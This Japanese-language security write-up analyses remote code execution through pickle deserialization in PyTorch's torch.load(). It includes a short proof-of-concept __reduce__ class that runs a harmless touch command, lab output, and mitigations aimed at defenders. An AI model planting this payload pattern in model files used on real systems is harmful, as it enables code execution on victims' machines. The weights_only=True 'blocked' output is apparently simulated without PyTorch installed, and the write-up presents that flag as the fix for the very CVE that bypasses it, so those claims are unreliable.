# ML モデルデシリアライゼーション RCE — 攻撃チェーン分析 (CVE-2025-32434)

> **PoC 再現 + 攻防クローズドループ検証**: 悪意のあるモデルファイル(.pt/.pkl)を作成し、pickle デシリアライゼーションで読み込み時に任意コード実行を引き起こし、`weights_only=True` で防御できることを実証。完全隔離コンテナ内で無害なコマンドのみ使用。
> **バージョン**: v1.0 · 攻撃面: ML モデルサプライチェーン

---

## 0. 概要

**根本原因**: PyTorch の `torch.load()` は内部で pickle デシリアライゼーションを使用。信頼できないモデルファイル(.pt/.pkl/HuggingFace 重み等)を読み込むとき、ファイルに悪意のある `__reduce__` オブジェクトが埋め込まれていれば、デシリアライゼーション時に**任意コマンドが自動実行**される——モデルサプライチェーン攻撃の最重大な着地点(モデル読み込み = 任意コード実行)。

**本 PoC での検証結果**:
- **97 バイト**の悪意 `.pt` ファイル → 読み込み時に `os.system` をトリガー → コマンド実行
- 同じファイルを `weights_only=True` で安全読み込み → **RCE は正常にブロック**

## 2. 攻撃原理とエクスプロイトチェーン

### 2.1 中核メカニズム: pickle の `__reduce__` フック

pickle は `__reduce__` を実装するオブジェクトをデシリアライズする際、返された `(関数, 引数)` を**自動的に呼び出します**。攻撃者はこれを使って `__reduce__` に `os.system(command)` を返させます:

```python
class Exploit:
    def __reduce__(self):
        return (os.system, ('touch /tmp/rce_demo',))
```

- `pickle.dumps(Exploit())` → 悪意バイナリファイル(.pt モデルに偽装)
- 被害者 `torch.load()` → pickle 解析 → `__reduce__` をヒット → `os.system('touch /tmp/rce_demo')` **即時実行**

### 2.2 エクスプロイトチェーン

```
攻撃者                        被害者
  │  悪意 .pt ファイルを作成      │
  │  __reduce__→os.system(cmd)  │
  │  ──────────────────► モデルをダウンロード/読み込み
  │          悪意 .pt           │ torch.load("model.pt")
  │                             │  └→ pickle デシリアライズ
  │                             │       └→ __reduce__ 発火
  │                             │            └→ os.system(cmd) ← RCE!
```

### 2.3 実際の攻撃シナリオ

- **HuggingFace 重みポイズニング**: モデルリポジトリの `.bin`/`.safetensors` や読み込みコードが改ざん
- **共有/ダウンロードされたモデルファイル**: 開発者が信頼できないモデルを `torch.load()`
- **モデル変換/ツールチェーン**: 第三者モデルを防御なしで処理するスクリプト
- **CI/CD サプライチェーン**: ポイズニングされたモデルを読み込む訓練/評価パイプライン

## 3. PoC 検証結果

### 3.1 環境(完全隔離)
- コンテナ: `redteam-attacker`(python3.12-slim、隔離ネットワーク `lab_internal`)
- 無害コマンド: `touch /tmp/rce_demo` + `id`
- ネットワークなし、リバースシェルなし、システム変更なし

### 3.2 攻撃成功(安全でない読み込み)

```
[+] 悪意ファイル生成: malicious_model.pt (97 bytes)
[*] 読み込み: malicious_model.pt
uid=0(root) gid=0(root) groups=0(root)
RCE_TRIGGERED_BY_PICKLE
[✔] RCE トリガー: /tmp/rce_demo 作成
    → 証明: 信頼できない pickle ファイルの読み込み = 任意コード実行
```

### 3.3 防御有効(weights_only=True)

```
[-] 安全読み込み: torch.load(weights_only=True)
[✔] 攻撃ブロック: [BLOCKED] 拒否: posix.system (weights_only が任意クラスを禁止)
    RCE 確認: /tmp/rce_demo 存在 = False  ← 実行されない
```

**攻防比較**: 同じ悪意ファイル → 不安全読み込みで RCE / 安全読み込みでブロック。

## 4. 対策(優先度順)

| # | 対策 | 備考 |
|---|------|------|
| 1 | `weights_only=True` を使用 | 公式 PyTorch 修正。既定で任意クラスを拒否。**最優先** |
| 2 | `pickle` で信頼できないデータを読み込まない | 中核原則: pickle に信頼できない入力を渡さない |
| 3 | 安全なモデル形式を使用 | Safetensors(テンソルのみ、コード実行なし)を pickle 系より優先 |
| 4 | モデルの出所/署名を検証 | HuggingFace リポジトリのホワイトリスト、チェックサム、出所監査 |
| 5 | 最小権限で実行 | 読み込み/訓練プロセスを低権限ユーザー・コンテナで実行 |

> **中核原則(Agent セキュリティと一致)**: 入力形式を信頼せず、権限は境界で強制。

## 5. 制限事項(正直な声明)

- 本 PoC は**既知の公開メカニズム**(CVE-2025-32434)を再現したもので、0-day ではない
- `python3.12-slim` で純 pickle により再現。PyTorch は実際には未インストール(メカニズムは同一: torch.load は内部で pickle)
- 無害コマンドは証明目的。実際の攻撃ではリバースシェル・ダウンロード実行を使用
- 検証は核心2点(RCE トリガー + weights_only ブロック)をカバー
